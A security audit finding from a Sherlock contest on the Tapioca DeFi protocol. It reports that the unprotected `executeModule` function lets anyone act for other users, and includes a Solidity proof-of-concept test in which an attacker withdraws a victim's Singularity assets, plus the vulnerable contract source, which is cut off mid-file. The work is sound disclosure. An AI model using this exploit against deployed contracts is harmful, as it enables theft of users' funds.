{
  "Title": "H-13: Unprotected `executeModule` function allows to steal the tokens",
  "Content": "# Issue H-13: Unprotected `executeModule` function allows to steal the tokens \n\nSource: https://github.com/sherlock-audit/2024-02-tapioca-judging/issues/134 \n\nThe protocol has acknowledged this issue.\n\n## Found by \nComposableSecurity, GiuseppeDeLaZara, Tendency, bin2chen\n## Summary\n\nThe `executeModule` function allows anyone to execute any module with any params. That allows attacker to execute operations on behalf of other users.\n\n## Vulnerability Detail\n\nHere is the `executeModule` function:\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/usdo/Usdo.sol#L152-L159\n\nAll its parameters are controlled by the caller and anyone can be the caller. Anyone can execute any module on behalf of any user.\n\nLet's try to steal someone's tokens using `UsdoMarketReceiver` module and `removeAssetReceiver` function (below is the PoC). \n\nHere is the code that will call the `executeModule` function:\n\n```solidity\nbUsdo.executeModule(\n    IUsdo.Module.UsdoMarketReceiver, \n    abi.encodeWithSelector(\n        UsdoMarketReceiverModule.removeAssetReceiver.selector, \n        marketMsg_), \n    false);\n```\n\nThe important value here is the `marketMsg_` parameter. The `removeAssetReceiver` function forwards the call to `exitPositionAndRemoveCollateral` function via magnetar contract.\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/Magnetar/modules/MagnetarOptionModule.sol#L150-L165\n\nThe `exitPositionAndRemoveCollateral` function removes asset from Singularity market if the `data.removeAndRepayData.removeAssetFromSGL` is `true`. The amount is taken from `data.removeAndRepayData.removeAmount`. Then, if `data.removeAndRepayData.assetWithdrawData.withdraw` is `true`, the `_withdrawToChain` is called.\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/gitmodule/tapioca-periph/contracts/Magnetar/modules/MagnetarOptionModule.sol#L51-L61\n\nIn `_withdrawToChain`, if the `data.lzSendParams.sendParam.dstEid` is zero, the `_withdrawHere` is called that transfers asset to `data.lzSendParams.sendParam.to`.\n\nSumming up, the following `marketMsg_` struct can be used to steal `userB`'s assets from singularity market by `userA`. \n\n```solidity\nMarketRemoveAssetMsg({\n    user: address(userB),//victim\n    externalData: ICommonExternalContracts({\n        magnetar: address(magnetar),\n        singularity: address(singularity),\n        bigBang: address(0),\n        marketHelper: address(marketHelper)\n    }),\n    removeAndRepayData: IRemoveAndRepay({\n        removeAssetFromSGL: true,//remove from Singularity market\n        removeAmount: tokenAmountSD,//amount to remove\n        repayAssetOnBB: false,\n        repayAmount: 0,\n        removeCollateralFromBB: false,\n        collateralAmount: 0,\n        exitData: IOptionsExitData({exit: false, target: address(0), oTAPTokenID: 0}),\n        unlockData: IOptionsUnlockData({unlock: false, target: address(0), tokenId: 0}),\n        assetWithdrawData: MagnetarWithdrawData({\n            withdraw: true,//withdraw assets\n            yieldBox: address(yieldBox), //where from to withdraw\n            assetId: bUsdoYieldBoxId, //what asset to withdraw\n            unwrap: false,\n            lzSendParams: LZSendParam({\n                refundAddress: address(userB),\n                fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                extraOptions: \"0x\",\n                sendParam: SendParam({\n                    amountLD: 0,\n                    composeMsg: \"0x\",\n                    dstEid: 0,\n                    extraOptions: \"0x\",\n                    minAmountLD: 0,\n                    oftCmd: \"0x\",\n                    to: OFTMsgCodec.addressToBytes32(address(userA)) // recipient of the assets\n                })\n            }),\n            sendGas: 0,\n            composeGas: 0,\n            sendVal: 0,\n            composeVal: 0,\n            composeMsg: \"0x\",\n            composeMsgType: 0\n        }),\n        collateralWithdrawData: MagnetarWithdrawData({\n            withdraw: false,\n            yieldBox: address(0),\n            assetId: 0,\n            unwrap: false,\n            lzSendParams: LZSendParam({\n                refundAddress: address(userB),\n                fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                extraOptions: \"0x\",\n                sendParam: SendParam({\n                    amountLD: 0,\n                    composeMsg: \"0x\",\n                    dstEid: 0,\n                    extraOptions: \"0x\",\n                    minAmountLD: 0,\n                    oftCmd: \"0x\",\n                    to: OFTMsgCodec.addressToBytes32(address(userB))\n                })\n            }),\n            sendGas: 0,\n            composeGas: 0,\n            sendVal: 0,\n            composeVal: 0,\n            composeMsg: \"0x\",\n            composeMsgType: 0\n        })\n    })\n});\n```\n\nHere is the modified version of the `test_market_remove_asset` test that achieves the same result, but with unauthorized call to `executeModule` function. The `userA` is the attacker, and `userB` is the victim.\n\n```solidity\n    function test_malicious_market_remove_asset() public {\n        uint256 erc20Amount_ = 1 ether;\n\n        // setup\n        {\n            deal(address(bUsdo), address(userB), erc20Amount_);\n\n            vm.startPrank(userB);\n            bUsdo.approve(address(yieldBox), type(uint256).max);\n            yieldBox.depositAsset(bUsdoYieldBoxId, address(userB), address(userB), erc20Amount_, 0);\n\n            uint256 sh = yieldBox.toShare(bUsdoYieldBoxId, erc20Amount_, false);\n            yieldBox.setApprovalForAll(address(pearlmit), true);\n            pearlmit.approve(\n                address(yieldBox), bUsdoYieldBoxId, address(singularity), uint200(sh), uint48(block.timestamp + 1)\n            );\n            singularity.addAsset(address(userB), address(userB), false, sh);\n            vm.stopPrank();\n        }\n\n        uint256 tokenAmount_ = 0.5 ether;\n\n        /**\n         * Actions\n         */\n        uint256 tokenAmountSD = usdoHelper.toSD(tokenAmount_, aUsdo.decimalConversionRate());\n\n        //approve magnetar\n        vm.startPrank(userB);\n        bUsdo.approve(address(magnetar), type(uint256).max);\n        singularity.approve(address(magnetar), type(uint256).max);\n        vm.stopPrank();\n        \n        MarketRemoveAssetMsg memory marketMsg = MarketRemoveAssetMsg({\n            user: address(userB),\n            externalData: ICommonExternalContracts({\n                magnetar: address(magnetar),\n                singularity: address(singularity),\n                bigBang: address(0),\n                marketHelper: address(marketHelper)\n            }),\n            removeAndRepayData: IRemoveAndRepay({\n                removeAssetFromSGL: true,\n                removeAmount: tokenAmountSD,\n                repayAssetOnBB: false,\n                repayAmount: 0,\n                removeCollateralFromBB: false,\n                collateralAmount: 0,\n                exitData: IOptionsExitData({exit: false, target: address(0), oTAPTokenID: 0}),\n                unlockData: IOptionsUnlockData({unlock: false, target: address(0), tokenId: 0}),\n                assetWithdrawData: MagnetarWithdrawData({\n                    withdraw: true,\n                    yieldBox: address(yieldBox),\n                    assetId: bUsdoYieldBoxId,\n                    unwrap: false,\n                    lzSendParams: LZSendParam({\n                        refundAddress: address(userB),\n                        fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                        extraOptions: \"0x\",\n                        sendParam: SendParam({\n                            amountLD: 0,\n                            composeMsg: \"0x\",\n                            dstEid: 0,\n                            extraOptions: \"0x\",\n                            minAmountLD: 0,\n                            oftCmd: \"0x\",\n                            to: OFTMsgCodec.addressToBytes32(address(userA)) // transfer to attacker\n                        })\n                    }),\n                    sendGas: 0,\n                    composeGas: 0,\n                    sendVal: 0,\n                    composeVal: 0,\n                    composeMsg: \"0x\",\n                    composeMsgType: 0\n                }),\n                collateralWithdrawData: MagnetarWithdrawData({\n                    withdraw: false,\n                    yieldBox: address(0),\n                    assetId: 0,\n                    unwrap: false,\n                    lzSendParams: LZSendParam({\n                        refundAddress: address(userB),\n                        fee: MessagingFee({lzTokenFee: 0, nativeFee: 0}),\n                        extraOptions: \"0x\",\n                        sendParam: SendParam({\n                            amountLD: 0,\n                            composeMsg: \"0x\",\n                            dstEid: 0,\n                            extraOptions: \"0x\",\n                            minAmountLD: 0,\n                            oftCmd: \"0x\",\n                            to: OFTMsgCodec.addressToBytes32(address(userB))\n                        })\n                    }),\n                    sendGas: 0,\n                    composeGas: 0,\n                    sendVal: 0,\n                    composeVal: 0,\n                    composeMsg: \"0x\",\n                    composeMsgType: 0\n                })\n            })\n        });\n        bytes memory marketMsg_ = usdoHelper.buildMarketRemoveAssetMsg(marketMsg);\n\n\n        // I added _checkSender in MagnetarMock (function exitPositionAndRemoveCollateral) so need to whitelist USDO\n        cluster.updateContract(aEid, address(bUsdo), true);\n\n        // ----- ADDED THIS ------>\n        // Attack using executeModule\n        // ------------------------\n        vm.startPrank(userA);\n        bUsdo.executeModule(\n            IUsdo.Module.UsdoMarketReceiver, \n            abi.encodeWithSelector(\n                UsdoMarketReceiverModule.removeAssetReceiver.selector, \n                marketMsg_), \n            false);\n        // ------------------------\n\n        // Check execution\n        {\n            assertEq(bUsdo.balanceOf(address(userB)), 0);\n            assertEq(\n                yieldBox.toAmount(bUsdoYieldBoxId, yieldBox.balanceOf(address(userB), bUsdoYieldBoxId), false),\n                0\n            );\n            assertEq(bUsdo.balanceOf(address(userA)), tokenAmount_);\n        }\n    }\n```\n\n**Note:** The `burst` function was modified in the MagnetarMock contract and add call to `_checkSender` function to reproduce the real situation.\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/test/MagnetarMock.sol#L62-L67\n\nThat is also why the `bUsdo` has been whitelisted in the test. \n\n## Impact\n\nHIGH - Anyone can steal others' tokens from their markets.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/Tapioca-bar/contracts/usdo/Usdo.sol#L152-L159\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/TapiocaZ/contracts/tOFT/mTOFT.sol#L198-L205\n\nhttps://github.com/sherlock-audit/2024-02-tapioca/blob/main/TapiocaZ/contracts/tOFT/TOFT.sol#L146-L153\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nThe `executeModule` function should inspect and validate the `_data` parameter to make sure that the caller is the same address as the user who executes the operations.\n\n\n\n## Discussion\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  seem valid; high(2)\n\n\n\n**cryptotechmaker**\n\nThese are the PRs I did for 19, which might solve it as well\n\n[Tapioca-DAO/Tapioca-bar#348](https://github.com/Tapioca-DAO/Tapioca-bar/pull/348)\n\n[Tapioca-DAO/TapiocaZ#172](https://github.com/Tapioca-DAO/TapiocaZ/pull/172)\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/170",
  "Code": [
    {
      "filename": "Tapioca-bar/contracts/usdo/Usdo.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n//LZ\nimport {IMessagingChannel} from \"@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessagingChannel.sol\";\nimport {MessagingReceipt, OFTReceipt} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oft/interfaces/IOFT.sol\";\nimport {OAppReceiver} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OAppReceiver.sol\";\nimport {Origin} from \"@layerzerolabs/lz-evm-oapp-v2/contracts/oapp/OApp.sol\";\n\n// External\nimport {ERC20Permit, ERC20} from \"@openzeppelin/contracts/token/ERC20/extensions/draft-ERC20Permit.sol\";\nimport {ReentrancyGuard} from \"@openzeppelin/contracts/security/ReentrancyGuard.sol\";\nimport {Pausable} from \"@openzeppelin/contracts/security/Pausable.sol\";\n\nimport {\n    IUsdo,\n    UsdoInitStruct,\n    UsdoModulesInitStruct,\n    LZSendParam,\n    ERC20PermitStruct\n} from \"tapioca-periph/interfaces/oft/IUsdo.sol\";\nimport {BaseTapiocaOmnichainEngine} from \"tapioca-periph/tapiocaOmnichainEngine/BaseTapiocaOmnichainEngine.sol\";\nimport {TapiocaOmnichainSender} from \"tapioca-periph/tapiocaOmnichainEngine/TapiocaOmnichainSender.sol\";\nimport {ICluster} from \"tapioca-periph/interfaces/periph/ICluster.sol\";\nimport {UsdoReceiver} from \"./modules/UsdoReceiver.sol\";\nimport {UsdoSender} from \"./modules/UsdoSender.sol\";\nimport {BaseUsdo} from \"./BaseUsdo.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\n/**\n * @title Usdo\n * @author TapiocaDAO\n * @notice The OmniDollar\n */\ncontract Usdo is BaseUsdo, Pausable, ReentrancyGuard, ERC20Permit {\n    error Usdo_NotValid();\n    error Usdo_NotAuthorized();\n\n    uint256 private _fees;\n\n    address public flashLoanHelper;\n\n    /**\n     * @notice addresses allowed to mint USDO\n     * @dev chainId>address>status\n     */\n    mapping(uint256 => mapping(address => bool)) public allowedMinter;\n    /**\n     * @notice addresses allowed to burn USDO\n     * @dev chainId>address>status\n     */\n    mapping(uint256 => mapping(address => bool)) public allowedBurner;\n\n    event SetMinterStatus(address indexed _for, bool _status);\n    event SetBurnerStatus(address indexed _for, bool _status);\n\n    constructor(UsdoInitStruct memory _initData, UsdoModulesInitStruct memory _modulesData)\n        BaseUsdo(_initData)\n        ERC20Permit(\"Tapioca Usdo\")\n    {\n        if (_modulesData.usdoSenderModule == address(0)) revert Usdo_NotValid();\n        if (_modulesData.usdoReceiverModule == address(0)) {\n            revert Usdo_NotValid();\n        }\n        if (_modulesData.marketReceiverModule == address(0)) {\n            revert Usdo_NotValid();\n        }\n        if (_modulesData.optionReceiverModule == address(0)) {\n            revert Usdo_NotValid();\n        }\n\n        _setModule(uint8(IUsdo.Module.UsdoSender), _modulesData.usdoSenderModule);\n        _setModule(uint8(IUsdo.Module.UsdoReceiver), _modulesData.usdoReceiverModule);\n        _setModule(uint8(IUsdo.Module.UsdoMarketReceiver), _modulesData.marketReceiverModule);\n        _setModule(uint8(IUsdo.Module.UsdoOptionReceiver), _modulesData.optionReceiverModule);\n\n        allowedMinter[_getChainId()][_initData.delegate] = true;\n        allowedBurner[_getChainId()][_initData.delegate] = true;\n    }\n\n    /**\n     * @dev Fallback function should handle calls made by endpoint, which should go to the receiver module.\n     */\n    fallback() external payable {\n        /// @dev Call the receiver module on fallback, assume it's gonna be called by endpoint.\n        _executeModule(uint8(IUsdo.Module.UsdoReceiver), msg.data, false);\n    }\n\n    receive() external payable {}\n\n    /**\n     * @inheritdoc BaseTapiocaOmnichainEngine\n     */\n    function transferFrom(address _from, address _to, uint256 _amount)\n        public\n        override(BaseTapiocaOmnichainEngine, ERC20)\n        returns (bool)\n    {\n        return BaseTapiocaOmnichainEngine.transferFrom(_from, _to, _amount);\n    }\n\n    /**\n     * @dev Slightly modified version of the OFT _lzReceive() operation.\n     * The composed message is sent to `address(this)` instead of `toAddress`.\n     * @dev Internal function to handle the receive on the LayerZero endpoint.\n     * @param _origin The origin information.\n     *  - srcEid: The source chain endpoint ID.\n     *  - sender: The sender address from the src chain.\n     *  - nonce: The nonce of the LayerZero message.\n     * @param _guid The unique identifier for the received LayerZero message.\n     * @param _message The encoded message.\n     * @dev _executor The address of the executor.\n     * @dev _extraData Additional data.\n     */\n    function lzReceive(\n        Origin calldata _origin,\n        bytes32 _guid,\n        bytes calldata _message,\n        address _executor, // @dev unused in the default implementation.\n        bytes calldata _extraData // @dev unused in the default implementation.\n    ) public payable override {\n        // Call the internal OApp implementation of lzReceive.\n        _executeModule(\n            uint8(IUsdo.Module.UsdoReceiver),\n            abi.encodeWithSelector(OAppReceiver.lzReceive.selector, _origin, _guid, _message, _executor, _extraData),\n            false\n        );\n    }\n\n    /**\n     * @notice Execute a call to a module.\n     * @dev Example on how `_data` should be encoded:\n     *      - abi.encodeCall(IERC20.transfer, (to, amount));\n     * @dev Use abi.encodeCall to encode the function call and its parameters with type safety.\n     *\n     * @param _module The module to execute.\n     * @param _data The data to execute. Should be ABI encoded with the selector.\n     * @param _forwardRevert If true, forward the revert message from the module.\n     *\n     * @return returnData The return data from the module execution, if any.\n     */\n    function executeModule(IUsdo.Module _module, bytes memory _data, bool _forwardRevert)\n        external\n        payable\n        whenNotPaused\n        returns (bytes memory returnData)\n    {\n        return _executeModule(uint8(_module), _data, _forwardRevert);\n    }\n\n    /**\n     * @dev Slightly modified version of the OFT send() operation. Includes a `_msgType` parameter.\n     * The `_buildMsgAndOptionsByType()` appends the packet type to the message.\n     * @dev Executes the send operation.\n     * @param _lzSendParam The parameters for the send operation.\n     *      - _sendParam: The parameters for the send operation.\n     *          - dstEid::uint32: Destination endpoint ID.\n     *          - to::bytes32: Recipient address.\n     *          - amountToSendLD::uint256: Amount to send in local decimals.\n     *          - minAmountToCreditLD::uint256: Minimum amount to credit in local decimals.\n     *      - _fee: The calculated fee for the send() operation.\n     *          - nativeFee::uint256: The native fee.\n     *          - lzTokenFee::uint256: The lzToken fee.\n     *      - _extraOptions::bytes: Additional options for the send() operation.\n     *      - refundAddress::address: The address to refund the native fee to.\n     * @param _composeMsg The composed message for the send() operation. Is a combination of 1 or more TAP specific messages.\n     *\n     * @return msgReceipt The receipt for the send operation.\n     *      - guid::bytes32: The unique identifier for the sent message.\n     *      - nonce::uint64: The nonce of the sent message.\n     *      - fee: The LayerZero fee incurred for the message.\n     *          - nativeFee::uint256: The native fee.\n     *          - lzTokenFee::uint256: The lzToken fee.\n     * @return oftReceipt The OFT receipt information.\n     *      - amountDebitLD::uint256: Amount of tokens ACTUALLY debited in local decimals.\n     *      - amountCreditLD::uint256: Amount of tokens to be credited on the remote side.\n     */\n    function sendPacket(LZSendParam calldata _lzSendParam, bytes calldata _composeMsg)\n        public\n        payable\n        whenNotPaused\n        returns (MessagingReceipt memory msgReceipt, OFTReceipt memory oftReceipt)\n    {\n        (msgReceipt, oftReceipt) = abi.decode(\n            _executeModule(\n                uint8(IUsdo.Module.UsdoSender),\n                abi.encodeCall(TapiocaOmnichainSender.sendPacket, (_lzSendParam, _composeMsg)),\n                false\n            ),\n            (MessagingReceipt, OFTReceipt)\n        );\n    }\n\n    /// =====================\n    /// View\n    /// =====================\n    /**\n     * @notice returns token's decimals\n     */\n    function decimals() public pure override returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev Returns the hash of the struct used by the permit function.\n     * @param _permitData Struct containing permit data.\n     */\n    function getTypedDataHash(ERC20PermitStruct calldata _permitData) public view returns (bytes32) {\n        bytes32 permitTypeHash_ =\n            keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n\n        bytes32 structHash_ = keccak256(\n            abi.encode(\n                permitTypeHash_,\n                _permitData.owner,\n                _permitData.spender,\n                _permitData.value,\n                _permitData.nonce,\n                _permitData.deadline\n            )\n        );\n        return _hashTypedDataV4(structHash_);\n    }\n\n    /// =====================\n    /// External\n    /// =====================\n    /**\n     * @notice mints USDO\n     * @param _to receiver address\n     * @param _amount the amount to mint\n     */\n    function mint(address _to, uint256 _amount) external whenNotPaused {\n        if (!allowedMinter[_getChainId()][msg.sender]) {\n            revert Usdo_NotAuthorized();\n        }\n        _mint(_to, _amount);\n    }\n\n    /**\n     * @notice burns USDO\n     * @param _from address to burn from\n     * @param _amount the amount to burn\n     */\n    function burn(address _from, uint256 _amount) external whenNotPaused {\n        if (!allowedBurner[_getChainId()][msg.sender]) {\n            revert Usdo_NotAuthorized();\n        }\n        _burn(_from, _amount);\n    }\n\n    /**\n     * @notice registeres flashloan fees\n     * @dev can only be called by the `FlashloanHelper` contract\n     * @param _fee fees amount\n     */\n    function addFlashloanFee(uint256 _fee) external {\n        if (msg.sender != flashLoanHelper) revert Usdo_NotAuthorized();\n        _fees += _fee;\n    }\n\n    /// =====================\n    /// Owner\n    /// =====================\n    /**\n     * @notice sets `FlashloanHelper` contract\n     * @param _helper the contract address\n     */\n    function setFlashloanHelper(address _helper) external onlyOwner {\n        flashLoanHelper = _helper;\n    }\n\n    /**\n     * @notice transfers fees to sender\n     */\n    function extractFees() external onlyOwner {\n        if (_fees > 0) {\n            uint256 balance = balanceOf(address(this));\n\n            uint256 toExtract = balance >= _fees ? _fees : balance;\n            _fees -= toExtract;\n            _transfer(address(this), msg.sender, toExtract);\n        }\n    }\n\n    /**\n     * @notice set the Cluster address.\n     * @param _cluster the new Cluster address\n     */\n    function setCluster(address _cluster) external virtual onlyOwner {\n        cluster = ICluster(_cluster);\n    }\n\n    /**\n     * @notice sets/unsets address as minter\n     * @dev can only be called by the owner\n     * @param _for role receiver\n     * @param _status true/false\n     */\n    function setMinterStatus(address _for, bool _status) external onlyOwner {\n        allowedMinter[_getChainId()][_for] = _status;\n        emit SetMinterStatus(_for, _status);\n    }\n\n    /**\n     * @notice sets/unsets address as burner\n     * @dev can only be called by the owner\n     * @param _for role receiver\n     * @param _status true/false\n     */\n    function setBurnerStatus(address _for, bool _status) external onlyOwner {\n        allowedBurner[_getChainId()][_for] = _status;\n        emit SetBurnerStatus(_for, _status);\n    }\n\n    /// =====================\n    /// Private\n    /// =====================\n    /**\n     * @notice Return the current chain EID.\n     */\n    function _getChainId() internal view virtual override returns (uint32) {\n        return IMessagingChannel(endpoint).eid();\n    }\n}"
    },
    {
      "filename": "Tapioca-bar/gitmodule/tapioca-periph/contracts/Magnetar/modules/MagnetarOptionModule.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// External\nimport {SafeERC20, IERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\n\n// Tapioca\nimport {ITapiocaOptionLiquidityProvision} from\n    \"tapioca-periph/interfaces/tap-token/ITapiocaOptionLiquidityProvision.sol\";\nimport {\n    ExitPositionAndRemoveCollateralData, MagnetarWithdrawData\n} from \"tapioca-periph/interfaces/periph/IMagnetar.sol\";\nimport {ITapiocaOptionBroker} from \"tapioca-periph/interfaces/tap-token/ITapiocaOptionBroker.sol\";\nimport {ITapiocaOption} from \"tapioca-periph/interfaces/tap-token/ITapiocaOption.sol\";\nimport {IMarketHelper} from \"tapioca-periph/interfaces/bar/IMarketHelper.sol\";\nimport {ISingularity} from \"tapioca-periph/interfaces/bar/ISingularity.sol\";\nimport {IYieldBox} from \"tapioca-periph/interfaces/yieldbox/IYieldBox.sol\";\nimport {IMarket, Module} from \"tapioca-periph/interfaces/bar/IMarket.sol\";\nimport {MagnetarBaseModule} from \"./MagnetarBaseModule.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\n/**\n * @title MagnetarOptionModule\n * @author TapiocaDAO\n * @notice Magnetar options related operations\n */\ncontract MagnetarOptionModule is MagnetarBaseModule {\n    using SafeERC20 for IERC20;\n\n    error Magnetar_ActionParamsMismatch();\n    error Magnetar_tOLPTokenMismatch();\n    error Magnetar_MarketCallFailed(bytes call);\n\n    /**\n     * @notice helper to exit from  tOB, unlock from tOLP, remove from SGL, repay on BB, remove collateral from BB and withdraw\n     * @dev all steps are optional:\n     *         - if `removeAndRepayData.exitData.exit` is false, the exit operation is skipped\n     *         - if `removeAndRepayData.unlockData.unlock` is false, the unlock operation is skipped\n     *         - if `removeAndRepayData.removeAssetFromSGL` is false, the removeAsset operation is skipped\n     *         - if `!removeAndRepayData.assetWithdrawData.withdraw && removeAndRepayData.repayAssetOnBB`, the repay operation is performed\n     *         - if `removeAndRepayData.removeCollateralFromBB` is false, the rmeove collateral is skipped\n     *     - the helper can either stop at the remove asset from SGL step or it can continue until is removes & withdraws collateral from BB\n     *         - removed asset can be withdrawn by providing `removeAndRepayData.assetWithdrawData`\n     *     - BB collateral can be removed by providing `removeAndRepayData.collateralWithdrawData`\n     */\n    function exitPositionAndRemoveCollateral(ExitPositionAndRemoveCollateralData memory data) public payable {\n        // Check sender\n        _checkSender(data.user);\n\n        // Check whitelisted\n        if (data.externalData.bigBang != address(0)) {\n            if (!cluster.isWhitelisted(0, data.externalData.bigBang)) {\n                revert Magnetar_TargetNotWhitelisted(data.externalData.bigBang);\n            }\n        }\n        if (data.externalData.singularity != address(0)) {\n            if (!cluster.isWhitelisted(0, data.externalData.singularity)) {\n                revert Magnetar_TargetNotWhitelisted(data.externalData.singularity);\n            }\n        }\n\n        IMarket bigBang_ = IMarket(data.externalData.bigBang);\n        ISingularity singularity_ = ISingularity(data.externalData.singularity);\n        IYieldBox yieldBox_ = IYieldBox(singularity_.yieldBox());\n\n        // if `removeAndRepayData.exitData.exit` the following operations are performed\n        //      - if ownerOfTapTokenId is user, transfers the oTAP token id to this contract\n        //      - tOB.exitPosition\n        //      - if `!removeAndRepayData.unlockData.unlock`, transfer the obtained tokenId to the user\n        uint256 tOLPId = 0;\n        if (data.removeAndRepayData.exitData.exit) {\n            if (data.removeAndRepayData.exitData.oTAPTokenID == 0) revert Magnetar_ActionParamsMismatch();\n            if (!cluster.isWhitelisted(0, data.removeAndRepayData.exitData.target)) {\n                revert Magnetar_TargetNotWhitelisted(data.removeAndRepayData.exitData.target);\n            }\n\n            address oTapAddress = ITapiocaOptionBroker(data.removeAndRepayData.exitData.target).oTAP();\n            (, ITapiocaOption.TapOption memory oTAPPosition) =\n                ITapiocaOption(oTapAddress).attributes(data.removeAndRepayData.exitData.oTAPTokenID);\n\n            tOLPId = oTAPPosition.tOLP;\n\n            address ownerOfTapTokenId = IERC721(oTapAddress).ownerOf(data.removeAndRepayData.exitData.oTAPTokenID);\n\n            if (ownerOfTapTokenId != data.user && ownerOfTapTokenId != address(this)) {\n                revert Magnetar_ActionParamsMismatch();\n            }\n            if (ownerOfTapTokenId == data.user) {\n                // IERC721(oTapAddress).safeTransferFrom(\n                //     data.user, address(this), data.removeAndRepayData.exitData.oTAPTokenID, \"0x\"\n                // );\n                pearlmit.transferFromERC721(\n                    data.user, address(this), oTapAddress, data.removeAndRepayData.exitData.oTAPTokenID\n                );\n            }\n            ITapiocaOptionBroker(data.removeAndRepayData.exitData.target).exitPosition(\n                data.removeAndRepayData.exitData.oTAPTokenID\n            );\n\n            if (!data.removeAndRepayData.unlockData.unlock) {\n                address tOLPContract = ITapiocaOptionBroker(data.removeAndRepayData.exitData.target).tOLP();\n\n                //transfer tOLP to the data.user\n                IERC721(tOLPContract).safeTransferFrom(address(this), data.user, tOLPId, \"0x\");\n            }\n        }\n\n        // performs a tOLP.unlock operation\n        if (data.removeAndRepayData.unlockData.unlock) {\n            if (!cluster.isWhitelisted(0, data.removeAndRepayData.unlockData.target)) {\n                revert Magnetar_TargetNotWhitelisted(data.removeAndRepayData.unlockData.target);\n            }\n\n            if (data.removeAndRepayData.unlockData.tokenId != 0) {\n                if (tOLPId != 0) {\n                    if (tOLPId != data.removeAndRepayData.unlockData.tokenId) {\n                        revert Magnetar_tOLPTokenMismatch();\n                    }\n                }\n                tOLPId = data.removeAndRepayData.unlockData.tokenId;\n            }\n\n            address ownerOfTOLP = IERC721(data.removeAndRepayData.unlockData.target).ownerOf(tOLPId);\n\n            if (ownerOfTOLP != data.user && ownerOfTOLP != address(this)) {\n                revert Magnetar_ActionParamsMismatch();\n            }\n\n            ITapiocaOptionLiquidityProvision(data.removeAndRepayData.unlockData.target).unlock(\n                tOLPId, data.externalData.singularity, data.user\n            );\n        }\n\n        // if `data.removeAndRepayData.removeAssetFromSGL` performs the follow operations:\n        //      - removeAsset from SGL\n        //      - if `data.removeAndRepayData.assetWithdrawData.withdraw` withdraws by using the `withdrawTo` operation\n        uint256 _removeAmount = data.removeAndRepayData.removeAmount;\n        if (data.removeAndRepayData.removeAssetFromSGL) {\n            uint256 _assetId = singularity_.assetId();\n            uint256 share = yieldBox_.toShare(_assetId, _removeAmount, false);\n\n            address removeAssetTo = data.removeAndRepayData.assetWithdrawData.withdraw\n                || data.removeAndRepayData.repayAssetOnBB ? address(this) : data.user;\n\n            singularity_.removeAsset(data.user, removeAssetTo, share);\n\n            //withdraw\n            if (data.removeAndRepayData.assetWithdrawData.withdraw) {\n                uint256 computedAmount = yieldBox_.toAmount(_assetId, share, false);\n                data.removeAndRepayData.assetWithdrawData.lzSendParams.sendParam.amountLD = computedAmount;\n                data.removeAndRepayData.assetWithdrawData.lzSendParams.sendParam.minAmountLD = computedAmount;\n                _withdrawToChain(data.removeAndRepayData.assetWithdrawData);\n            }\n        }\n\n        // performs a BigBang repay operation\n        if (!data.removeAndRepayData.assetWithdrawData.withdraw && data.removeAndRepayData.repayAssetOnBB) {\n            _setApprovalForYieldBox(address(bigBang_), yieldBox_);\n\n            (Module[] memory modules, bytes[] memory calls) = IMarketHelper(data.externalData.marketHelper).repay(\n                address(this), data.user, false, data.removeAndRepayData.repayAmount\n            );\n            (bool[] memory successes, bytes[] memory results) = bigBang_.execute(modules, calls, true);\n\n            if (!successes[0]) revert Magnetar_MarketCallFailed(calls[0]);\n            uint256 repayed = IMarketHelper(data.externalData.marketHelper).repayView(results[0]);\n            // transfer excess amount to the data.user\n            if (repayed < _removeAmount) {\n                uint256 bbAssetId = bigBang_.assetId();\n                yieldBox_.transfer(\n                    address(this), data.user, bbAssetId, yieldBox_.toShare(bbAssetId, _removeAmount - repayed, false)\n                );\n            }\n        }\n\n        // performs a BigBang removeCollateral operation\n        // if `data.removeAndRepayData.collateralWithdrawData.withdraw` withdraws by using the `withdrawTo` method\n        if (data.removeAndRepayData.removeCollateralFromBB) {\n            uint256 _collateralId 